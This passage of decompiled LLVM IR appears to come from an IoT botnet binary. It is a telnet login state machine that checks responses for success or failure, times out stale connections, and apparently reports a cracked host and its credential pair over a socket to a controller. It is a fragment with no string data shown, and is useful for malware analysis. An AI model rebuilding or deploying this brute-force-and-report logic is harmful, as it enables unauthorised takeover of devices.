  %v4_804d528 = load i32, i32* %v3_804d528, align 4
  store i32 %v4_804d528, i32* %eax.global-to-local, align 4
  %v0_804d52b = load i32, i32* @esp, align 4
  %v1_804d52e = add i32 %v0_804d52b, -16
  %v2_804d52e = inttoptr i32 %v1_804d52e to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_805b240.257 to i32), i32* %v2_804d52e, align 4
  %v1_804d533 = add i32 %v0_804d52b, -20
  %v2_804d533 = inttoptr i32 %v1_804d533 to i32*
  store i32 512, i32* %v2_804d533, align 4
  %v0_804d538 = load i32, i32* @ebx, align 4
  %v2_804d538 = add i32 %v0_804d52b, -24
  %v3_804d538 = inttoptr i32 %v2_804d538 to i32*
  store i32 %v0_804d538, i32* %v3_804d538, align 4
  %v5_804d539 = add i32 %v0_804d52b, -28
  %v6_804d539 = inttoptr i32 %v5_804d539 to i32*
  store i32 %arg1, i32* %v6_804d539, align 4
  %v0_804d53c = load i32, i32* %eax.global-to-local, align 4
  %v2_804d53c = add i32 %v0_804d52b, -32
  %v3_804d53c = inttoptr i32 %v2_804d53c to i32*
  store i32 %v0_804d53c, i32* %v3_804d53c, align 4
  %v1_804d53d = call i32 @read_until_response(i32 %v6_804ca0d)
  store i32 %v1_804d53d, i32* %eax.global-to-local, align 4
  %v0_804d542 = load i32, i32* @esp, align 4
  %v1_804d545 = icmp eq i32 %v1_804d53d, 0
  br i1 %v1_804d545, label %dec_label_pc_804d730, label %dec_label_pc_804d54d

dec_label_pc_804d54d:                             ; preds = %dec_label_pc_804d4f5
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804d553 = add i32 %v0_804d542, 16
  %v2_804d553 = inttoptr i32 %v1_804d553 to i32*
  store i32 0, i32* %v2_804d553, align 4
  %v1_804d555 = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804d555 = call i32 @__GI_time(i32* %v1_804d555)
  store i32 %v2_804d555, i32* @esi, align 4
  %v0_804d562 = load i32, i32* @ebx, align 4
  %v2_804d572 = mul i32 %v0_804d562, 28
  %v1_804d576 = add i32 %v2_804d574, %v2_804d572
  %v2_804d579 = inttoptr i32 %v1_804d576 to i32*
  store i32 %v2_804d555, i32* %v2_804d579, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v1_804d50d, i32* %eax.global-to-local, align 4
  %v2_804d596 = load i32, i32* %v1_804d510, align 4
  store i32 %v2_804d596, i32* %eax.global-to-local, align 4
  %v0_804d598 = load i32, i32* @esp, align 4
  %v2_804d59b = add i32 %v0_804d598, -16
  %v3_804d59b = inttoptr i32 %v2_804d59b to i32*
  store i32 %v2_804d596, i32* %v3_804d59b, align 4
  %v1_804d59c = call i32 @contains_fail(i32 %stack_var_-624.243)
  store i32 %v1_804d59c, i32* %eax.global-to-local, align 4
  %v0_804d5a1 = load i32, i32* @esp, align 4
  %v1_804d5a4 = icmp eq i32 %v1_804d59c, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d5a4, label %dec_label_pc_804d5d4, label %dec_label_pc_804d5a8

dec_label_pc_804d5a8:                             ; preds = %dec_label_pc_804d54d
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d5c4 = add i32 %v0_804d5a1, 4
  %v2_804d5c4 = inttoptr i32 %v1_804d5c4 to i32*
  store i32 0, i32* %v2_804d5c4, align 4
  %v0_804d5c6 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d5c6 = inttoptr i32 %v0_804d5a1 to i32*
  store i32 %v0_804d5c6, i32* %v3_804d5c6, align 4
  %v3_804d5c7 = call i32 @advance_state(i32* %v1_804d555, i32 %stack_var_-620.244)
  store i32 %v3_804d5c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d5d4:                             ; preds = %dec_label_pc_804d54d
  store i32 %v1_804d50d, i32* %eax.global-to-local, align 4
  %v2_804d5ef = load i32, i32* %v1_804d510, align 4
  store i32 %v2_804d5ef, i32* %eax.global-to-local, align 4
  %v3_804d5f4 = inttoptr i32 %v0_804d5a1 to i32*
  store i32 %v2_804d5ef, i32* %v3_804d5f4, align 4
  %v1_804d5f5 = call i32 @contains_success(i32 %stack_var_-624.243)
  store i32 %v1_804d5f5, i32* %eax.global-to-local, align 4
  %v0_804d5fa = load i32, i32* @esp, align 4
  %v1_804d5fd = icmp eq i32 %v1_804d5f5, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d5fd, label %dec_label_pc_804d706, label %dec_label_pc_804d605

dec_label_pc_804d605:                             ; preds = %dec_label_pc_804d5d4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d61b = add i32 %v2_804ca50, %v2_804c9bc
  %v4_804d61b = inttoptr i32 %v3_804d61b to i8*
  %v5_804d61b = load i8, i8* %v4_804d61b, align 1
  %v6_804d61b = zext i8 %v5_804d61b to i32
  %v9_804d61b = or i32 %v6_804d61b, %v8_804ca0d
  store i32 %v9_804d61b, i32* %eax.global-to-local, align 4
  %v10_804d61f = icmp eq i8 %v5_804d61b, 2
  %v1_804d621 = icmp eq i1 %v10_804d61f, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d621, label %dec_label_pc_804d64f, label %dec_label_pc_804d623

dec_label_pc_804d623:                             ; preds = %dec_label_pc_804d605
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d63f = add i32 %v0_804d5fa, 4
  %v2_804d63f = inttoptr i32 %v1_804d63f to i32*
  store i32 7, i32* %v2_804d63f, align 4
  %v0_804d641 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d641 = inttoptr i32 %v0_804d5fa to i32*
  store i32 %v0_804d641, i32* %v3_804d641, align 4
  %v3_804d642 = call i32 @advance_state(i32* %v1_804d555, i32 %stack_var_-620.244)
  store i32 %v3_804d642, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d64f:                             ; preds = %dec_label_pc_804d605
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d665 = add i32 %v2_804cb3f, %v2_804c9bc
  %v4_804d665 = inttoptr i32 %v3_804d665 to i8*
  %v5_804d665 = load i8, i8* %v4_804d665, align 1
  %v6_804d665 = zext i8 %v5_804d665 to i32
  store i32 %v6_804d665, i32* %eax.global-to-local, align 4
  %v1_804d66e = mul nuw nsw i32 %v6_804d665, 4
  %v2_804d66e = add nuw nsw i32 %v1_804d66e, 134590896
  %v3_804d66e = inttoptr i32 %v2_804d66e to i32*
  %v4_804d66e = load i32, i32* %v3_804d66e, align 4
  store i32 %v4_804d66e, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d68b = add i32 %v2_804cb79, %v2_804c9bc
  %v4_804d68b = inttoptr i32 %v3_804d68b to i8*
  %v5_804d68b = load i8, i8* %v4_804d68b, align 2
  %v6_804d68b = zext i8 %v5_804d68b to i32
  store i32 %v6_804d68b, i32* %eax.global-to-local, align 4
  %v1_804d694 = mul nuw nsw i32 %v6_804d68b, 4
  %v2_804d694 = add nuw nsw i32 %v1_804d694, 134590884
  %v3_804d694 = inttoptr i32 %v2_804d694 to i32*
  %v4_804d694 = load i32, i32* %v3_804d694, align 4
  store i32 %v4_804d694, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d6b7 = inttoptr i32 %v0_804d5fa to i32*
  store i32 %v2_804c9be, i32* %v3_804d6b7, align 4
  %v0_804d6b8 = call i32 @get_telstate_host()
  store i32 %v0_804d6b8, i32* %eax.global-to-local, align 4
  %v0_804d6bd = load i32, i32* @esp, align 4
  %v0_804d6c0 = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_804d6c0, i32* %edx.global-to-local, align 4
  %v0_804d6c9 = load i32, i32* @ebx, align 4
  %v3_804d6c9 = inttoptr i32 %v0_804d6bd to i32*
  store i32 %v0_804d6c9, i32* %v3_804d6c9, align 4
  %v0_804d6ca = load i32, i32* @esi, align 4
  %v2_804d6ca = add i32 %v0_804d6bd, -4
  %v3_804d6ca = inttoptr i32 %v2_804d6ca to i32*
  store i32 %v0_804d6ca, i32* %v3_804d6ca, align 4
  %v2_804d6cb = add i32 %v0_804d6bd, -8
  %v3_804d6cb = inttoptr i32 %v2_804d6cb to i32*
  store i32 %v0_804d6b8, i32* %v3_804d6cb, align 4
  %v1_804d6cc = add i32 %v0_804d6bd, -12
  %v2_804d6cc = inttoptr i32 %v1_804d6cc to i32*
  store i32 ptrtoint ([23 x i8]* @global_var_8058972.258 to i32), i32* %v2_804d6cc, align 4
  %v0_804d6d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d6d1 = add i32 %v0_804d6bd, -16
  %v3_804d6d1 = inttoptr i32 %v2_804d6d1 to i32*
  store i32 %v0_804d6d1, i32* %v3_804d6d1, align 4
  %v2_804d6d2 = call i32 @sockprintf(i32 %stack_var_-624.243, i32 %stack_var_-620.244)
  %v0_804d6d7 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804d6f6 = add i32 %v0_804d6d7, 20
  %v2_804d6f6 = inttoptr i32 %v1_804d6f6 to i32*
  store i32 7, i32* %v2_804d6f6, align 4
  %v0_804d6f8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d6f8 = add i32 %v0_804d6d7, 16
  %v3_804d6f8 = inttoptr i32 %v2_804d6f8 to i32*
  store i32 %v0_804d6f8, i32* %v3_804d6f8, align 4
  %v3_804d6f9 = call i32 @advance_state(i32* %v1_804d555, i32 %stack_var_-620.244)
  store i32 %v3_804d6f9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d706:                             ; preds = %dec_label_pc_804d5d4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d722 = inttoptr i32 %v0_804d5fa to i32*
  store i32 %v2_804c9be, i32* %v3_804d722, align 4
  %v1_804d723 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804d723, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d730:                             ; preds = %dec_label_pc_804d4f5
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d74b = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d74b, i32* %eax.global-to-local, align 4
  %v1_804d74d = add i32 %v2_804d74b, 7
  store i32 %v1_804d74d, i32* @ebx, align 4
  %v1_804d753 = add i32 %v0_804d542, 16
  %v2_804d753 = inttoptr i32 %v1_804d753 to i32*
  store i32 0, i32* %v2_804d753, align 4
  %v1_804d755 = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804d755 = call i32 @__GI_time(i32* %v1_804d755)
  store i32 %v2_804d755, i32* %eax.global-to-local, align 4
  %v0_804d75d = load i32, i32* @ebx, align 4
  %v7_804d75d = icmp ult i32 %v0_804d75d, %v2_804d755
  %v1_804d75f = icmp eq i1 %v7_804d75d, false
  br i1 %v1_804d75f, label %dec_label_pc_804d8eb, label %dec_label_pc_804d765

dec_label_pc_804d765:                             ; preds = %dec_label_pc_804d730
  %v0_804d75a = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d781 = inttoptr i32 %v0_804d75a to i32*
  store i32 %v2_804c9be, i32* %v3_804d781, align 4
  %v1_804d782 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804d782, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d78f:                             ; preds = %dec_label_pc_804c9f7
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804d792 = load i32, i32* @esp, align 4
  %v1_804d795 = add i32 %v0_804d792, -16
  %v2_804d795 = inttoptr i32 %v1_804d795 to i32*
  store i32 0, i32* %v2_804d795, align 4
  %v1_804d797 = inttoptr i32 %v6_804ca0d to i32*
  %v2_804d797 = call i32 @__GI_time(i32* %v1_804d797)
  %v0_804d7a4 = load i32, i32* @ebx, align 4
  %v2_804d7b4 = mul i32 %v0_804d7a4, 28
  %v1_804d7b8 = add i32 %v2_804d574, %v2_804d7b4
  %v2_804d7bb = inttoptr i32 %v1_804d7b8 to i32*
  store i32 %v2_804d797, i32* %v2_804d7bb, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804d7d3 = inttoptr i32 %v2_804c9be to i32*
  %v4_804d7d3 = load i32, i32* %v3_804d7d3, align 4
  store i32 %v4_804d7d3, i32* %eax.global-to-local, align 4
  %v0_804d7d6 = load i32, i32* @esp, align 4
  %v1_804d7d6 = add i32 %v0_804d7d6, -4
  %v2_804d7d6 = inttoptr i32 %v1_804d7d6 to i32*
  store i32 16384, i32* %v2_804d7d6, align 4
  %v1_804d7db = add i32 %v0_804d7d6, -8
  %v2_804d7db = inttoptr i32 %v1_804d7db to i32*
  store i32 4, i32* %v2_804d7db, align 4
  %v1_804d7dd = add i32 %v0_804d7d6, -12
  %v2_804d7dd = inttoptr i32 %v1_804d7dd to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8058989.259 to i32), i32* %v2_804d7dd, align 4
  %v0_804d7e2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d7e2 = add i32 %v0_804d7d6, -16
  %v3_804d7e2 = inttoptr i32 %v2_804d7e2 to i32*
  store i32 %v0_804d7e2, i32* %v3_804d7e2, align 4
  %v4_804d7e3 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  %v0_804d7e8 = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d801 = load i32, i32* %v3_804d7d3, align 4
  store i32 %v4_804d801, i32* %eax.global-to-local, align 4
  %v1_804d804 = add i32 %v0_804d7e8, 12
  %v2_804d804 = inttoptr i32 %v1_804d804 to i32*
  store i32 16384, i32* %v2_804d804, align 4
  %v1_804d809 = add i32 %v0_804d7e8, 8
  %v2_804d809 = inttoptr i32 %v1_804d809 to i32*
  store i32 7, i32* %v2_804d809, align 4
  %v1_804d80b = add i32 %v0_804d7e8, 4
  %v2_804d80b = inttoptr i32 %v1_804d80b to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_805898e.260 to i32), i32* %v2_804d80b, align 4
  %v0_804d810 = load i32, i32* %eax.global-to-local, align 4
  %v3_804d810 = inttoptr i32 %v0_804d7e8 to i32*
  store i32 %v0_804d810, i32* %v3_804d810, align 4
  %v4_804d811 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804c8c7, i32 %v6_804ca0d)
  %v0_804d819 = load i32, i32* bitcast ([7 x i8*]* @global_var_805b1a0.265 to i32*), align 32
  %v5_804d823 = inttoptr i32 %v0_804d819 to i8*
  %v1_804d829 = and i32 %v0_804d819, -256
  store i32 %v1_804d829, i32* %eax.global-to-local, align 4
  store i32 %v0_804d819, i32* @edi, align 4
  %v3_804d832 = call i32 @_strlen(i8* %v5_804d823)
  store i32 %v3_804d832, i32* @ebx, align 4
  %v0_804d83b = load i32, i32* bitcast ([7 x i8*]* @global_var_805b1a0.265 to i32*), align 32
  store i32 %v0_804d83b, i32* @esi, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804d857 = load i32, i32* %v3_804d7d3, align 4
  store i32 %v4_804d857, i32* %eax.global-to-local, align 4
  %v0_804d85a = load i32, i32* @esp, align 4
  %v1_804d85a = add i32 %v0_804d85a, -4
  %v2_804d85a = inttoptr i32 %v1_804d85a to i32*
  store i32 16384, i32* %v2_804d85a, align 4
  %v0_804d85f = load i32, i32* @ebx, align 4
  %v2_804d85f = add i32 %v0_804d85a, -8
  %v3_804d85f = inttoptr i32 %v2_804d85f to i32*
  store i32 %v0_804d85f, i32* %v3_804d85f, align 4
  %v0_804d860 = load i32, i32* @esi, align 4
  %v2_804d860 = add i32 %v0_804d85a, -12
  %v3_804d860 = inttoptr i32 %v2_804d860 to i32*
  store i32 %v0_804d860, i32* %v3_804d860, align 4
  %v0_804d861 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d861 = add i32 %v0_804d85a, -16
  %v3_804d861 = inttoptr i32 %v2_804d861 to i32*
  store i32 %v0_804d861, i32* %v3_804d861, align 4
  %v5_804d862 = call i32 @__libc_send(i32 %v0_804d819, i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804c8c7)
  store i32 %v5_804d862, i32* %eax.global-to-local, align 4
  %v0_804d867 = load i32, i32* @esp, align 4
  %v2_804d86a = icmp slt i32 %v5_804d862, 0
  %v1_804d86c = icmp eq i1 %v2_804d86a, false
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804d86c, label %dec_label_pc_804d895, label %dec_label_pc_804d86e

dec_label_pc_804d86e:                             ; preds = %dec_label_pc_804d78f
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d88a = inttoptr i32 %v0_804d867 to i32*
  store i32 %v2_804c9be, i32* %v3_804d88a, align 4
  %v2_804d88b = call i32 @reset_telstate(i32 %v0_804d819)
  store i32 %v2_804d88b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d895:                             ; preds = %dec_label_pc_804d78f
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v2_804d8b0 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804d8b0, i32* %eax.global-to-local, align 4
  %v1_804d8b2 = add i32 %v2_804d8b0, 25
  store i32 %v1_804d8b2, i32* @ebx, align 4
  %v2_804d8b8 = inttoptr i32 %v0_804d867 to i32*
  store i32 0, i32* %v2_804d8b8, align 4
  %tmp39 = inttoptr i32 %v0_804d819 to i32*
  %v3_804d8ba = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804d8ba, i32* %eax.global-to-local, align 4
  %v0_804d8c2 = load i32, i32* @ebx, align 4
  %v7_804d8c2 = icmp ult i32 %v0_804d8c2, %v3_804d8ba
  %v1_804d8c4 = icmp eq i1 %v7_804d8c2, false
  br i1 %v1_804d8c4, label %dec_label_pc_804d8eb, label %dec_label_pc_804d8c6

dec_label_pc_804d8c6:                             ; preds = %dec_label_pc_804d895
  %v0_804d8bf = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v3_804d8e2 = inttoptr i32 %v0_804d8bf to i32*
  store i32 %v2_804c9be, i32* %v3_804d8e2, align 4
  %v2_804d8e3 = call i32 @reset_telstate(i32 %v0_804d819)
  store i32 %v2_804d8e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804d8eb:                             ; preds = %dec_label_pc_804c9f7, %dec_label_pc_804d895, %dec_label_pc_804d730, %dec_label_pc_804d34e, %dec_label_pc_804d0ca, %dec_label_pc_804cf8e, %dec_label_pc_804cc17, %dec_label_pc_804d86e, %dec_label_pc_804d765, %dec_label_pc_804d706, %dec_label_pc_804d64f, %dec_label_pc_804d623, %dec_label_pc_804d5a8, %dec_label_pc_804d4c9, %dec_label_pc_804d49f, %dec_label_pc_804d443, %dec_label_pc_804d383, %dec_label_pc_804d322, %dec_label_pc_804d2f6, %dec_label_pc_804d245, %dec_label_pc_804d21b, %dec_label_pc_804d1bf, %dec_label_pc_804d0ff, %dec_label_pc_804d09e, %dec_label_pc_804d072, %dec_label_pc_804cfc3, %dec_label_pc_804cf64, %dec_label_pc_804cedc, %dec_label_pc_804ceb2, %dec_label_pc_804cd7c, %dec_label_pc_804cd52, %dec_label_pc_804cbf7, %dec_label_pc_804cbb9, %dec_label_pc_804d8c6
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.243, %dec_label_pc_804c9f7 ], [ %stack_var_-624.243, %dec_label_pc_804d895 ], [ %stack_var_-624.243, %dec_label_pc_804d8c6 ], [ %stack_var_-624.243, %dec_label_pc_804d86e ], [ %stack_var_-624.243, %dec_label_pc_804d730 ], [ %stack_var_-624.243, %dec_label_pc_804d765 ], [ %stack_var_-624.243, %dec_label_pc_804d706 ], [ %stack_var_-624.243, %dec_label_pc_804d64f ], [ %stack_var_-624.243, %dec_label_pc_804d623 ], [ %stack_var_-624.243, %dec_label_pc_804d5a8 ], [ %v4_804d3cc, %dec_label_pc_804d4c9 ], [ %v4_804d3cc, %dec_label_pc_804d49f ], [ %v4_804d3cc, %dec_label_pc_804d443 ], [ %stack_var_-624.243, %dec_label_pc_804d34e ], [ %stack_var_-624.243, %dec_label_pc_804d383 ], [ %stack_var_-624.243, %dec_label_pc_804d322 ], [ %stack_var_-624.243, %dec_label_pc_804d2f6 ], [ %stack_var_-624.243, %dec_label_pc_804d245 ], [ %stack_var_-624.243, %dec_label_pc_804d21b ], [ %stack_var_-624.243, %dec_label_pc_804d1bf ], [ %stack_var_-624.243, %dec_label_pc_804d0ca ], [ %stack_var_-624.243, %dec_label_pc_804d0ff ], [ %stack_var_-624.243, %dec_label_pc_804d09e ], [ %stack_var_-624.243, %dec_label_pc_804d072 ], [ %stack_var_-624.243, %dec_label_pc_804cf8e ], [ %stack_var_-624.243, %dec_label_pc_804cfc3 ], [ %stack_var_-624.243, %dec_label_pc_804cf64 ], [ %stack_var_-624.243, %dec_label_pc_804cedc ], [ %stack_var_-624.243, %dec_label_pc_804ceb2 ], [ %stack_var_-624.243, %dec_label_pc_804cc17 ], [ %stack_var_-624.243, %dec_label_pc_804cd7c ], [ %stack_var_-624.243, %dec_label_pc_804cd52 ], [ %stack_var_-624.243, %dec_label_pc_804cbf7 ], [ %stack_var_-624.243, %dec_label_pc_804cbb9 ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.244, %dec_label_pc_804c9f7 ], [ %stack_var_-620.244, %dec_label_pc_804d895 ], [ %stack_var_-620.244, %dec_label_pc_804d8c6 ], [ %stack_var_-620.244, %dec_label_pc_804d86e ], [ %stack_var_-620.244, %dec_label_pc_804d730 ], [ %stack_var_-620.244, %dec_label_pc_804d765 ], [ %stack_var_-620.244, %dec_label_pc_804d706 ], [ %stack_var_-620.244, %dec_label_pc_804d64f ], [ %stack_var_-620.244, %dec_label_pc_804d623 ], [ %stack_var_-620.244, %dec_label_pc_804d5a8 ], [ %stack_var_-620.244, %dec_label_pc_804d4c9 ], [ %stack_var_-620.244, %dec_label_pc_804d49f ], [ %stack_var_-620.244, %dec_label_pc_804d443 ], [ %stack_var_-620.244, %dec_label_pc_804d34e ], [ %stack_var_-620.244, %dec_label_pc_804d383 ], [ %stack_var_-620.244, %dec_label_pc_804d322 ], [ %stack_var_-620.244, %dec_label_pc_804d2f6 ], [ %v4_804d148, %dec_label_pc_804d245 ], [ %v4_804d148, %dec_label_pc_804d21b ], [ %v4_804d148, %dec_label_pc_804d1bf ], [ %stack_var_-620.244, %dec_label_pc_804d0ca ], [ %stack_var_-620.244, %dec_label_pc_804d0ff ], [ %stack_var_-620.244, %dec_label_pc_804d09e ], [ %stack_var_-620.244, %dec_label_pc_804d072 ], [ %stack_var_-620.244, %dec_label_pc_804cf8e ], [ %stack_var_-620.244, %dec_label_pc_804cfc3 ], [ %stack_var_-620.244, %dec_label_pc_804cf64 ], [ %stack_var_-620.244, %dec_label_pc_804cedc ], [ %stack_var_-620.244, %dec_label_pc_804ceb2 ], [ %stack_var_-620.244, %dec_label_pc_804cc17 ], [ %stack_var_-620.244, %dec_label_pc_804cd7c ], [ %stack_var_-620.244, %dec_label_pc_804cd52 ], [ %stack_var_-620.244, %dec_label_pc_804cbf7 ], [ %stack_var_-620.244, %dec_label_pc_804cbb9 ]
  %v4_804d8eb = add nuw nsw i32 %storemerge45, 1
  store i32 %v4_804d8eb, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804d8eb, %arg2
  br i1 %exitcond, label %dec_label_pc_804c99c, label %dec_label_pc_804c9a8

; uselistorder directives
  uselistorder i32 %v4_804d8eb, { 1, 2, 0 }
  uselistorder i32 %stack_var_-620.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %v0_804d7e8, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804d5fa, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804d5a1, { 1, 2, 0 }
  uselistorder i32* %v1_804d555, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804d498, { 1, 0, 2 }
  uselistorder i32 %v0_804d43c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804d3cc, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804d33e, { 1, 0 }
  uselistorder i32 %v0_804d2ef, { 1, 2, 0 }
  uselistorder i32 %v0_804d214, { 1, 0, 2 }
  uselistorder i32 %v0_804d1b8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804d148, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804d0ba, { 1, 0 }
  uselistorder i32 %v0_804d06b, { 1, 2, 0 }
  uselistorder i32 %v0_804cf2f, { 1, 0 }
  uselistorder i32 %v13_804cf07, { 1, 0 }
  uselistorder i32 %v0_804cf02, { 2, 0, 1 }
  uselistorder i32 %v0_804ce4d, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804ce48, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804cdf8, { 1, 0 }
  uselistorder i32 %v2_804cddc, { 1, 0 }
  uselistorder i32 %v0_804cd95, { 1, 0 }
  uselistorder i32 %v0_804cd10, { 2, 0, 1 }
  uselistorder i32 %v12_804cce8, { 1, 0 }
  uselistorder i32 %v0_804cce3, { 2, 0, 1 }
  uselistorder i32 %v2_804cc65, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_804cc2a, { 2, 0, 1 }
  uselistorder i32 %v2_804ca77, { 1, 0 }
  uselistorder i32 %v6_804ca0d, { 9, 10, 11, 8, 6, 7, 5, 3, 4, 2, 1, 13, 12, 14, 0 }
  uselistorder i32* %v1_804c9c3, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804c9c0, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804c9be, { 49, 50, 51, 52, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 33, 34, 35, 36, 37, 27, 28, 29, 30, 31, 32, 22, 23, 24, 25, 26, 16, 17, 18, 19, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804c9bc, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 45, 8, 44, 9 }
  uselistorder i32 %v1_804c9ae, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.243, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %stack_var_-620.244, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %storemerge45, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804c98b, { 1, 2, 0 }
  uselistorder i32 %storemerge251, { 1, 0 }
  uselistorder i32 %v2_804c8e4, { 1, 0 }
  uselistorder i32 %v2_804c8c7, { 14, 13, 12, 16, 15, 17, 18, 21, 20, 19, 5, 6, 7, 8, 22, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32 %v1_804c873, { 1, 0, 2 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 3, 2, 1, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 5, 3, 4, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 6, 0, 10, 8, 4, 5, 9, 2, 1, 7, 11, 3, 12, 13 }
